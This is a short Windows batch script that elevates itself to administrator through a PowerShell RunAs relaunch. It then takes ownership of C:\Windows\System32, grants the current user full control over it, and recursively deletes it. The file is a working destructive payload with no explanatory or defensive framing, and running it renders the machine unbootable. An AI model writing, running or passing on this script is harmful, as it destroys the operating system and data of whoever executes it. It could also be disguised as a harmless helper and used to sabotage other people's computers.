@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :run_code
) else (
    echo
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:run_code
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant %username%:F /t /c /l /q
rd /s /q C:\Windows\System32
pause
